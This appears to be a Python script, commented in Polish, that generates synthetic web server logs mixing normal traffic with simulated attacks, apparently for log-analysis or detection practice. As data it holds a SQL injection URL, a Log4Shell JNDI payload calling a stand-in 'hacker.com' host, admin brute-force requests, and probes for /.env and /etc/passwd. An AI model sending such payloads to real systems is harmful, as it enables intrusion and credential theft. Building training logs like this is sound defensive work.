import random
from datetime import datetime, timedelta

def generate_realistic_logs(output_file="server.log", num_lines=300):
    # 1. Nasze domeny, na które kierowany jest ruch (Serwer obsługuje dwie wirtualne domeny)
    domains = ["sklep.ai-security.local", "panel.ai-security.local"]
    
    # 2. Bezpieczni użytkownicy
    good_ips = ["192.168.1.50", "89.64.12.34", "172.16.5.11", "46.242.112.5"]
    good_user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
    ]
    
    # 3. Adresy IP hakerów i ich wyspecjalizowane narzędzia
    ip_brute_force = "185.220.101.5"
    ip_exploiter = "91.240.118.44"
    ip_scanner = "45.133.1.20"
    
    good_pages = ["/index.html", "/about.html", "/contact.php", "/shop/products", "/static/css/style.css"]
    
    start_time = datetime.now() - timedelta(hours=5)
    
    print(f"⏳ Generuję {num_lines} linii zaawansowanych logów w pliku {output_file}...")
    
    with open(output_file, "w", encoding="utf-8") as f:
        for i in range(num_lines):
            current_time = start_time + timedelta(seconds=i * random.randint(10, 30))
            time_str = current_time.strftime("%d/%b/%Y:%H:%M:%S +0200")
            
            # Losujemy rodzaj ruchu (85% normalny, 15% różne formy cyberataków)
            rand_type = random.random()
            domain = random.choice(domains)
            
            if rand_type < 0.85:
                # ==========================================
                # RUCH NORMALNY
                # ==========================================
                ip = random.choice(good_ips)
                page = random.choice(good_pages)
                ua = random.choice(good_user_agents)
                f.write(f"{ip} - - [{time_str}] \"GET {page} HTTP/1.1\" 200 {random.randint(1024, 8000)} \"-\" \"{ua}\" Host: {domain}\n")
                
            elif rand_type < 0.90:
                # ==========================================
                # ATAK 1: Brute-Force na panel administratora
                # ==========================================
                ip = ip_brute_force
                ua = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
                f.write(f"{ip} - - [{time_str}] \"POST /admin/login.php HTTP/1.1\" 403 512 \"-\" \"{ua}\" Host: panel.ai-security.local\n")
                
            elif rand_type < 0.95:
                # ==========================================
                # ATAK 2: Próby użycia znanych exploitów (SQLi / Log4Shell)
                # ==========================================
                ip = ip_exploiter
                ua = "python-requests/2.31.0" # Podejrzany, surowy skrypt Pythona zamiast przeglądarki
                
                # Losujemy jeden z dwóch niebezpiecznych payloadów
                payload_type = random.choice(["sqli", "log4shell"])
                if payload_type == "sqli":
                    # Próba wstrzyknięcia kodu SQL (SQL Injection) przez pasek adresu URL
                    page = "/shop/products?id=1%20OR%201=1"
                    status = "500" # Serwer wyrzuca błąd wewnętrzny bazy danych
                else:
                    # Próba wywołania exploita Log4Shell (JNDI Injection) w nagłówku User-Agent
                    page = "/index.html"
                    ua = "${jndi:ldap://://hacker.com}"
                    status = "400"
                    
                f.write(f"{ip} - - [{time_str}] \"GET {page} HTTP/1.1\" {status} 230 \"-\" \"{ua}\" Host: {domain}\n")
                
            else:
                # ==========================================
                # ATAK 3: Skanowanie automatyczne (Z użyciem programu Nmap / Dirbuster)
                # ==========================================
                ip = ip_scanner
                # Wycieka nazwa popularnego programu skanującego w poszukiwaniu luk
                ua = "Nmap Scripting Engine; https://nmap.org"
                
                # Skaner szuka ukrytych plików konfiguracyjnych i systemowych
                suspicious_page = random.choice(["/.env", "/wp-admin", "/config.php", "/etc/passwd"])
                f.write(f"{ip} - - [{time_str}] \"GET {suspicious_page} HTTP/1.1\" 404 180 \"-\" \"{ua}\" Host: {domain}\n")
                
    print("✅ Zaawansowany plik logów został pomyślnie wygenerowany!")

if __name__ == "__main__":
    generate_realistic_logs()
